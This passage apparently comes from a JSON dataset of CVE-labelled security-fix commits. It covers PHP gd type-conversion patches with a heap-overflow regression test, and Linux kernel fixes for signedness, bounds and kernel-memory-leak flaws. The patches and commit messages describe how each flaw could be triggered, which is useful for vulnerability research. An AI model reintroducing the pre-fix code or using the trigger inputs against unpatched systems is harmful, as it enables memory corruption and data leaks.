Z_LVAL_PP(var);\n+\t\t\t}\n \t\t}\n \t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2) + 1, (void **) &var) == SUCCESS) {\n-\t\t\tSEPARATE_ZVAL(var);\n-\t\t\tconvert_to_long(*var);\n-\t\t\tpoints[i].y = Z_LVAL_PP(var);\n+\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **var;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\tpoints[i].y = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\tpoints[i].y = Z_LVAL_PP(var);\n+\t\t\t}\n \t\t}\n \t}\n \n@@ -4859,9 +4877,15 @@ PHP_FUNCTION(imageconvolution)\n \n \t\t\tfor (j=0; j<3; j++) {\n \t\t\t\tif (zend_hash_index_find(Z_ARRVAL_PP(var), (j), (void **) &var2) == SUCCESS) {\n-\t\t\t\t\tSEPARATE_ZVAL(var2);\n-\t\t\t\t\tconvert_to_double(*var2);\n-\t\t\t\t\tmatrix[i][j] = (float)Z_DVAL_PP(var2);\n+\t\t\t\t\tif (Z_TYPE_PP(var2) != IS_DOUBLE) {\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **var;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\tmatrix[i][j] = (float)Z_DVAL(dval);\n+\t\t\t\t\t} else {\n+\t\t\t\t\t\tmatrix[i][j] = (float)Z_DVAL_PP(var2);\n+\t\t\t\t\t}\n \t\t\t\t} else {\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"You must have a 3x3 matrix\");\n \t\t\t\t\tRETURN_FALSE;\n@@ -4954,28 +4978,60 @@ PHP_FUNCTION(imagecrop)\n \tZEND_FETCH_RESOURCE(im, gdImagePtr, &IM, -1, \"Image\", le_gd);\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"x\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\trect.x = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.x = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.x = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing x position\");\n \t\tRETURN_FALSE;\n \t}\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"y\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\trect.y = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.y = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.y = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing y position\");\n \t\tRETURN_FALSE;\n \t}\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"width\", sizeof(\"width\"), (void **)&tmp) != FAILURE) {\n-\t\trect.width = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.width = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.width = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing width\");\n \t\tRETURN_FALSE;\n \t}\n \n \tif (zend_hash_find(HASH_OF(z_rect), \"height\", sizeof(\"height\"), (void **)&tmp) != FAILURE) {\n-\t\trect.height = Z_LVAL_PP(tmp);\n+\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **tmp;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\trect.height = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\trect.height = Z_LVAL_PP(tmp);\n+\t\t}\n \t} else {\n \t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing height\");\n \t\tRETURN_FALSE;\n@@ -5124,8 +5180,13 @@ PHP_FUNCTION(imageaffine)\n \t\t\t\t\taffine[i] = Z_DVAL_PP(zval_affine_elem);\n \t\t\t\t\tbreak;\n \t\t\t\tcase IS_STRING:\n-\t\t\t\t\tconvert_to_double_ex(zval_affine_elem);\n-\t\t\t\t\taffine[i] = Z_DVAL_PP(zval_affine_elem);\n+\t\t\t\t\t{\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **zval_affine_elem;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\taffine[i] = Z_DVAL(dval);\n+\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tdefault:\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Invalid type for element %i\", i);\n@@ -5136,32 +5197,60 @@ PHP_FUNCTION(imageaffine)\n \n \tif (z_rect != NULL) {\n \t\tif (zend_hash_find(HASH_OF(z_rect), \"x\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.x = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.x = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.x = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing x position\");\n \t\t\tRETURN_FALSE;\n \t\t}\n \n \t\tif (zend_hash_find(HASH_OF(z_rect), \"y\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.y = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.y = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.y = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing y position\");\n \t\t\tRETURN_FALSE;\n \t\t}\n \n \t\tif (zend_hash_find(HASH_OF(z_rect), \"width\", sizeof(\"width\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.width = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.width = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.width = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing width\");\n \t\t\tRETURN_FALSE;\n \t\t}\n \n \t\tif (zend_hash_find(HASH_OF(z_rect), \"height\", sizeof(\"height\"), (void **)&tmp) != FAILURE) {\n-\t\t\tconvert_to_long_ex(tmp);\n-\t\t\trect.height = Z_LVAL_PP(tmp);\n+\t\t\tif (Z_TYPE_PP(tmp) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **tmp;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\trect.height = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\trect.height = Z_LVAL_PP(tmp);\n+\t\t\t}\n \t\t} else {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing height\");\n \t\t\tRETURN_FALSE;\n@@ -5211,16 +5300,30 @@ PHP_FUNCTION(imageaffinematrixget)\n \t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Array expected as options\");\n \t\t\t}\n \t\t\tif (zend_hash_find(HASH_OF(options), \"x\", sizeof(\"x\"), (void **)&tmp) != FAILURE) {\n-\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\tx = Z_DVAL_PP(tmp);\n+\t\t\t\tif (Z_TYPE_PP(tmp) != IS_DOUBLE) {\n+\t\t\t\t\tzval dval;\n+\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\tx = Z_DVAL(dval);\n+\t\t\t\t} else {\n+\t\t\t\t\tx = Z_DVAL_PP(tmp);\n+\t\t\t\t}\n \t\t\t} else {\n \t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing x position\");\n \t\t\t\tRETURN_FALSE;\n \t\t\t}\n \n \t\t\tif (zend_hash_find(HASH_OF(options), \"y\", sizeof(\"y\"), (void **)&tmp) != FAILURE) {\n-\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\ty = Z_DVAL_PP(tmp);\n+\t\t\t\tif (Z_TYPE_PP(tmp) != IS_DOUBLE) {\n+\t\t\t\t\tzval dval;\n+\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\ty = Z_DVAL(dval);\n+\t\t\t\t} else {\n+\t\t\t\t\ty = Z_DVAL_PP(tmp);\n+\t\t\t\t}\n \t\t\t} else {\n \t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Missing y position\");\n \t\t\t\tRETURN_FALSE;\n@@ -5300,8 +5403,13 @@ PHP_FUNCTION(imageaffinematrixconcat)\n \t\t\t\t\tm1[i] = Z_DVAL_PP(tmp);\n \t\t\t\t\tbreak;\n \t\t\t\tcase IS_STRING:\n-\t\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\t\tm1[i] = Z_DVAL_PP(tmp);\n+\t\t\t\t\t{\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\tm1[i] = Z_DVAL(dval);\n+\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tdefault:\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Invalid type for element %i\", i);\n@@ -5317,8 +5425,13 @@ PHP_FUNCTION(imageaffinematrixconcat)\n \t\t\t\t\tm2[i] = Z_DVAL_PP(tmp);\n \t\t\t\t\tbreak;\n \t\t\t\tcase IS_STRING:\n-\t\t\t\t\tconvert_to_double_ex(tmp);\n-\t\t\t\t\tm2[i] = Z_DVAL_PP(tmp);\n+\t\t\t\t\t{\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **tmp;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\tm2[i] = Z_DVAL(dval);\n+\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\tdefault:\n \t\t\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Invalid type for element %i\", i);\ndiff --git a\/ext\/gd\/tests\/bug66356.phpt b\/ext\/gd\/tests\/bug66356.phpt\nnew file mode 100644\nindex 000000000000..f88149471640\n--- \/dev\/null\n+++ b\/ext\/gd\/tests\/bug66356.phpt\n@@ -0,0 +1,22 @@\n+--TEST--\n+Bug #66356 (Heap Overflow Vulnerability in imagecrop())\n+--SKIPIF--\n+<?php\n+\tif(!extension_loaded('gd')){ die('skip gd extension not available'); }\n+?>\n+--FILE--\n+<?php\n+$img = imagecreatetruecolor(10, 10);\n+$img = imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10));\n+$arr = array(\"x\" => \"a\", \"y\" => \"12b\", \"width\" => 10, \"height\" => 10);\n+$img = imagecrop($img, $arr);\n+print_r($arr);\n+?>\n+--EXPECTF--\n+Array\n+(\n+    [x] => a\n+    [y] => 12b\n+    [width] => 10\n+    [height] => 10\n+)\ndiff --git a\/main\/php_version.h b\/main\/php_version.h\nindex 8d30a367d368..d9ea4aab3cd6 100644\n--- a\/main\/php_version.h\n+++ b\/main\/php_version.h\n@@ -2,7 +2,7 @@\n \/* edit configure.in to change version number *\/\n #define PHP_MAJOR_VERSION 5\n #define PHP_MINOR_VERSION 5\n-#define PHP_RELEASE_VERSION 8\n+#define PHP_RELEASE_VERSION 5\n #define PHP_EXTRA_VERSION \"-dev\"\n-#define PHP_VERSION \"5.5.8-dev\"\n-#define PHP_VERSION_ID 50508\n+#define PHP_VERSION \"5.5.5-dev\"\n+#define PHP_VERSION_ID 50505\n","owner":"php","repo":"php-src","source":"cve"},{"CVE_ID":"CVE-2012-0038","CWE_ID":"189","category":"security","commit_id":"fa8b18edd752a8b4e9d1ee2cd615b82c93cf8bba","commit_message":"From fa8b18edd752a8b4e9d1ee2cd615b82c93cf8bba Mon Sep 17 00:00:00 2001\nFrom: Christoph Hellwig <hch@infradead.org>\nDate: Sun, 20 Nov 2011 15:35:32 +0000\nSubject: [PATCH] xfs: validate acl count\n\nThis prevents in-memory corruption and possible panics if the on-disk\nACL is badly corrupted.\n\nSigned-off-by: Christoph Hellwig <hch@lst.de>\nSigned-off-by: Ben Myers <bpm@sgi.com>\n---\n fs\/xfs\/xfs_acl.c | 2 ++\n 1 file changed, 2 insertions(+)\n\n","diff_code":"diff --git a\/fs\/xfs\/xfs_acl.c b\/fs\/xfs\/xfs_acl.c\nindex b6c4b3795c4a0..76e4266d2e7e4 100644\n--- a\/fs\/xfs\/xfs_acl.c\n+++ b\/fs\/xfs\/xfs_acl.c\n@@ -42,6 +42,8 @@ xfs_acl_from_disk(struct xfs_acl *aclp)\n \tint count, i;\n \n \tcount = be32_to_cpu(aclp->acl_cnt);\n+\tif (count > XFS_ACL_MAX_ENTRIES)\n+\t\treturn ERR_PTR(-EFSCORRUPTED);\n \n \tacl = posix_acl_alloc(count, GFP_KERNEL);\n \tif (!acl)\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-0521","CWE_ID":"189","category":"security","commit_id":"cb26a24ee9706473f31d34cc259f4dcf45cd0644","commit_message":"From cb26a24ee9706473f31d34cc259f4dcf45cd0644 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <error27@gmail.com>\nDate: Fri, 7 Jan 2011 16:41:54 -0300\nSubject: [media] [v3,media] av7110: check for negative array offset\n\ninfo->num comes from the user.  It's type int.  If the user passes\nin a negative value that would cause memory corruption.\n\nSigned-off-by: Dan Carpenter <error27@gmail.com>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>\n---\n drivers\/media\/dvb\/ttpci\/av7110_ca.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/media\/dvb\/ttpci\/av7110_ca.c b\/drivers\/media\/dvb\/ttpci\/av7110_ca.c\nindex 122c72806916..9fc1dd0ba4c3 100644\n--- a\/drivers\/media\/dvb\/ttpci\/av7110_ca.c\n+++ b\/drivers\/media\/dvb\/ttpci\/av7110_ca.c\n@@ -277,7 +277,7 @@ static int dvb_ca_ioctl(struct file *file, unsigned int cmd, void *parg)\n \t{\n \t\tca_slot_info_t *info=(ca_slot_info_t *)parg;\n \n-\t\tif (info->num > 1)\n+\t\tif (info->num < 0 || info->num > 1)\n \t\t\treturn -EINVAL;\n \t\tav7110->ci_slot[info->num].num = info->num;\n \t\tav7110->ci_slot[info->num].type = FW_CI_LL_SUPPORT(av7110->arm_app) ?\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-2211","CWE_ID":"189","category":"security","commit_id":"21c5977a836e399fc710ff2c5367845ed5c2527f","commit_message":"From 21c5977a836e399fc710ff2c5367845ed5c2527f Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 15 Jun 2011 15:09:01 -0700\nSubject: alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but\nmostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds\nkernel memory to userland.\n\n2. Signedness issue in osf_sysinfo allows copying large amounts of\nkernel memory to userland.\n\n3. Typo (?) in osf_getsysinfo bounds minimum instead of maximum copy\nsize, allowing copying large amounts of kernel memory to userland.\n\n4. Usage of user pointer in osf_wait4 while under KERNEL_DS allows\nprivilege escalation via writing return value of sys_wait4 to kernel\nmemory.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: Richard Henderson <rth@twiddle.net>\nCc: Ivan Kokshaysky <ink@jurassic.park.msu.ru>\nCc: Matt Turner <mattst88@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/alpha\/kernel\/osf_sys.c | 11 +++++++----\n 1 file changed, 7 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/arch\/alpha\/kernel\/osf_sys.c b\/arch\/alpha\/kernel\/osf_sys.c\nindex 376f22130791..326f0a2d56e5 100644\n--- a\/arch\/alpha\/kernel\/osf_sys.c\n+++ b\/arch\/alpha\/kernel\/osf_sys.c\n@@ -409,7 +409,7 @@ SYSCALL_DEFINE2(osf_getdomainname, char __user *, name, int, namelen)\n \t\treturn -EFAULT;\n \n \tlen = namelen;\n-\tif (namelen > 32)\n+\tif (len > 32)\n \t\tlen = 32;\n \n \tdown_read(&uts_sem);\n@@ -594,7 +594,7 @@ SYSCALL_DEFINE3(osf_sysinfo, int, command, char __user *, buf, long, count)\n \tdown_read(&uts_sem);\n \tres = sysinfo_table[offset];\n \tlen = strlen(res)+1;\n-\tif (len > count)\n+\tif ((unsigned long)len > (unsigned long)count)\n \t\tlen = count;\n \tif (copy_to_user(buf, res, len))\n \t\terr = -EFAULT;\n@@ -649,7 +649,7 @@ SYSCALL_DEFINE5(osf_getsysinfo, unsigned long, op, void __user *, buffer,\n \t\treturn 1;\n \n \tcase GSI_GET_HWRPB:\n-\t\tif (nbytes < sizeof(*hwrpb))\n+\t\tif (nbytes > sizeof(*hwrpb))\n \t\t\treturn -EINVAL;\n \t\tif (copy_to_user(buffer, hwrpb, nbytes) != 0)\n \t\t\treturn -EFAULT;\n@@ -1008,6 +1008,7 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n {\n \tstruct rusage r;\n \tlong ret, err;\n+\tunsigned int status = 0;\n \tmm_segment_t old_fs;\n \n \tif (!ur)\n@@ -1016,13 +1017,15 @@ SYSCALL_DEFINE4(osf_wait4, pid_t, pid, int __user *, ustatus, int, options,\n \told_fs = get_fs();\n \t\t\n \tset_fs (KERNEL_DS);\n-\tret = sys_wait4(pid, ustatus, options, (struct rusage __user *) &r);\n+\tret = sys_wait4(pid, (unsigned int __user *) &status, options,\n+\t\t\t(struct rusage __user *) &r);\n \tset_fs (old_fs);\n \n \tif (!access_ok(VERIFY_WRITE, ur, sizeof(*ur)))\n \t\treturn -EFAULT;\n \n \terr = 0;\n+\terr |= put_user(status, ustatus);\n \terr |= __put_user(r.ru_utime.tv_sec, &ur->ru_utime.tv_sec);\n \terr |= __put_user(r.ru_utime.tv_usec, &ur->ru_utime.tv_usec);\n \terr |= __put_user(r.ru_stime.tv_sec, &ur->ru_stime.tv_sec);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4165","CWE_ID":"189","category":"security","commit_id":"7a1abd08d52fdeddb3e9a5a33f2f15cc6a5674d2","commit_message":"From 7a1abd08d52fdeddb3e9a5a33f2f15cc6a5674d2 Mon Sep 17 00:00:00 2001\nFrom: \"David S. Miller\" <davem@davemloft.net>\nDate: Wed, 10 Nov 2010 21:35:37 -0800\nSubject: tcp: Increase TCP_MAXSEG socket option minimum.\n\nAs noted by Steve Chen, since commit\nf5fff5dc8a7a3f395b0525c02ba92c95d42b7390 (\"tcp: advertise MSS\nrequested by user\") we can end up with a situation where\ntcp_select_initial_window() does a divide by a zero (or\neven negative) mss value.\n\nThe problem is that sometimes we effectively subtract\nTCPOLEN_TSTAMP_ALIGNED and\/or TCPOLEN_MD5SIG_ALIGNED from the mss.\n\nFix this by increasing the minimum from 8 to 64.\n\nReported-by: Steve Chen <schen@mvista.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv4\/tcp.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/ipv4\/tcp.c b\/net\/ipv4\/tcp.c\nindex 245603c4ad48..081419969485 100644\n--- a\/net\/ipv4\/tcp.c\n+++ b\/net\/ipv4\/tcp.c\n@@ -2246,7 +2246,7 @@ static int do_tcp_setsockopt(struct sock *sk, int level,\n \t\t\/* Values greater than interface MTU won't take effect. However\n \t\t * at the point when this call is done we typically don't yet\n \t\t * know which interface is going to be used *\/\n-\t\tif (val < 8 || val > MAX_TCP_WINDOW) {\n+\t\tif (val < 64 || val > MAX_TCP_WINDOW) {\n \t\t\terr = -EINVAL;\n \t\t\tbreak;\n \t\t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-2959","CWE_ID":"189","category":"security","commit_id":"5b75c4973ce779520b9d1e392483207d6f842cde","commit_message":"From 5b75c4973ce779520b9d1e392483207d6f842cde Mon Sep 17 00:00:00 2001\nFrom: Oliver Hartkopp <socketcan@hartkopp.net>\nDate: Wed, 11 Aug 2010 16:12:35 -0700\nSubject: can: add limit for nframes and clean up signed\/unsigned variables\n\nThis patch adds a limit for nframes as the number of frames in TX_SETUP and\nRX_SETUP are derived from a single byte multiplex value by default.\nUse-cases that would require to send\/filter more than 256 CAN frames should\nbe implemented in userspace for complexity reasons anyway.\n\nAdditionally the assignments of unsigned values from userspace to signed\nvalues in kernelspace and vice versa are fixed by using unsigned values in\nkernelspace consistently.\n\nSigned-off-by: Oliver Hartkopp <socketcan@hartkopp.net>\nReported-by: Ben Hawkes <hawkes@google.com>\nAcked-by: Urs Thuermann <urs.thuermann@volkswagen.de>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/can\/bcm.c | 41 +++++++++++++++++++++++++++--------------\n 1 file changed, 27 insertions(+), 14 deletions(-)\n\n","diff_code":"diff --git a\/net\/can\/bcm.c b\/net\/can\/bcm.c\nindex 9c65e9deb9c3..08ffe9e4be20 100644\n--- a\/net\/can\/bcm.c\n+++ b\/net\/can\/bcm.c\n@@ -60,6 +60,13 @@\n #include <net\/sock.h>\n #include <net\/net_namespace.h>\n \n+\/*\n+ * To send multiple CAN frame content within TX_SETUP or to filter\n+ * CAN messages with multiplex index within RX_SETUP, the number of\n+ * different filters is limited to 256 due to the one byte index value.\n+ *\/\n+#define MAX_NFRAMES 256\n+\n \/* use of last_frames[index].can_dlc *\/\n #define RX_RECV    0x40 \/* received data for this element *\/\n #define RX_THR     0x80 \/* element not been sent due to throttle feature *\/\n@@ -89,16 +96,16 @@ struct bcm_op {\n \tstruct list_head list;\n \tint ifindex;\n \tcanid_t can_id;\n-\tint flags;\n+\tu32 flags;\n \tunsigned long frames_abs, frames_filtered;\n \tstruct timeval ival1, ival2;\n \tstruct hrtimer timer, thrtimer;\n \tstruct tasklet_struct tsklet, thrtsklet;\n \tktime_t rx_stamp, kt_ival1, kt_ival2, kt_lastmsg;\n \tint rx_ifindex;\n-\tint count;\n-\tint nframes;\n-\tint currframe;\n+\tu32 count;\n+\tu32 nframes;\n+\tu32 currframe;\n \tstruct can_frame *frames;\n \tstruct can_frame *last_frames;\n \tstruct can_frame sframe;\n@@ -175,7 +182,7 @@ static int bcm_proc_show(struct seq_file *m, void *v)\n \n \t\tseq_printf(m, \"rx_op: %03X %-5s \",\n \t\t\t\top->can_id, bcm_proc_getifname(ifname, op->ifindex));\n-\t\tseq_printf(m, \"[%d]%c \", op->nframes,\n+\t\tseq_printf(m, \"[%u]%c \", op->nframes,\n \t\t\t\t(op->flags & RX_CHECK_DLC)?'d':' ');\n \t\tif (op->kt_ival1.tv64)\n \t\t\tseq_printf(m, \"timeo=%lld \",\n@@ -198,7 +205,7 @@ static int bcm_proc_show(struct seq_file *m, void *v)\n \n \tlist_for_each_entry(op, &bo->tx_ops, list) {\n \n-\t\tseq_printf(m, \"tx_op: %03X %s [%d] \",\n+\t\tseq_printf(m, \"tx_op: %03X %s [%u] \",\n \t\t\t\top->can_id,\n \t\t\t\tbcm_proc_getifname(ifname, op->ifindex),\n \t\t\t\top->nframes);\n@@ -283,7 +290,7 @@ static void bcm_send_to_user(struct bcm_op *op, struct bcm_msg_head *head,\n \tstruct can_frame *firstframe;\n \tstruct sockaddr_can *addr;\n \tstruct sock *sk = op->sk;\n-\tint datalen = head->nframes * CFSIZ;\n+\tunsigned int datalen = head->nframes * CFSIZ;\n \tint err;\n \n \tskb = alloc_skb(sizeof(*head) + datalen, gfp_any());\n@@ -468,7 +475,7 @@ rx_changed_settime:\n  * bcm_rx_cmp_to_index - (bit)compares the currently received data to formerly\n  *                       received data stored in op->last_frames[]\n  *\/\n-static void bcm_rx_cmp_to_index(struct bcm_op *op, int index,\n+static void bcm_rx_cmp_to_index(struct bcm_op *op, unsigned int index,\n \t\t\t\tconst struct can_frame *rxdata)\n {\n \t\/*\n@@ -554,7 +561,8 @@ static enum hrtimer_restart bcm_rx_timeout_handler(struct hrtimer *hrtimer)\n \/*\n  * bcm_rx_do_flush - helper for bcm_rx_thr_flush\n  *\/\n-static inline int bcm_rx_do_flush(struct bcm_op *op, int update, int index)\n+static inline int bcm_rx_do_flush(struct bcm_op *op, int update,\n+\t\t\t\t  unsigned int index)\n {\n \tif ((op->last_frames) && (op->last_frames[index].can_dlc & RX_THR)) {\n \t\tif (update)\n@@ -575,7 +583,7 @@ static int bcm_rx_thr_flush(struct bcm_op *op, int update)\n \tint updated = 0;\n \n \tif (op->nframes > 1) {\n-\t\tint i;\n+\t\tunsigned int i;\n \n \t\t\/* for MUX filter we start at index 1 *\/\n \t\tfor (i = 1; i < op->nframes; i++)\n@@ -624,7 +632,7 @@ static void bcm_rx_handler(struct sk_buff *skb, void *data)\n {\n \tstruct bcm_op *op = (struct bcm_op *)data;\n \tconst struct can_frame *rxframe = (struct can_frame *)skb->data;\n-\tint i;\n+\tunsigned int i;\n \n \t\/* disable timeout *\/\n \thrtimer_cancel(&op->timer);\n@@ -822,14 +830,15 @@ static int bcm_tx_setup(struct bcm_msg_head *msg_head, struct msghdr *msg,\n {\n \tstruct bcm_sock *bo = bcm_sk(sk);\n \tstruct bcm_op *op;\n-\tint i, err;\n+\tunsigned int i;\n+\tint err;\n \n \t\/* we need a real device to send frames *\/\n \tif (!ifindex)\n \t\treturn -ENODEV;\n \n-\t\/* we need at least one can_frame *\/\n-\tif (msg_head->nframes < 1)\n+\t\/* check nframes boundaries - we need at least one can_frame *\/\n+\tif (msg_head->nframes < 1 || msg_head->nframes > MAX_NFRAMES)\n \t\treturn -EINVAL;\n \n \t\/* check the given can_id *\/\n@@ -993,6 +1002,10 @@ static int bcm_rx_setup(struct bcm_msg_head *msg_head, struct msghdr *msg,\n \t\tmsg_head->nframes = 0;\n \t}\n \n+\t\/* the first element contains the mux-mask => MAX_NFRAMES + 1  *\/\n+\tif (msg_head->nframes > MAX_NFRAMES + 1)\n+\t\treturn -EINVAL;\n+\n \tif ((msg_head->flags & RX_RTR_FRAME) &&\n \t    ((msg_head->nframes != 1) ||\n \t     (!(msg_head->can_id & CAN_RTR_FLAG))))\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2673","CWE_ID":"189","category":"security","commit_id":"83231d0ab5ed60015797c3d1ad9056295ac3b2bb","commit_message":"From 83231d0ab5ed60015797c3d1ad9056295ac3b2bb Mon Sep 17 00:00:00 2001\nFrom: Hans Boehm <Hans.Boehm@hp.com>\nDate: Thu, 15 Mar 2012 21:09:05 +0400\nSubject: [PATCH] Speedup calloc size overflow check by preventing division if\n small values\n\n* malloc.c (GC_SQRT_SIZE_MAX): New macro.\n* malloc.c (calloc): Add fast initial size overflow check to avoid\ninteger division for reasonably small values passed.\n---\n malloc.c | 5 ++++-\n 1 file changed, 4 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/malloc.c b\/malloc.c\nindex cb49a5cf..c9b9eb6a 100644\n--- a\/malloc.c\n+++ b\/malloc.c\n@@ -381,9 +381,12 @@ void * 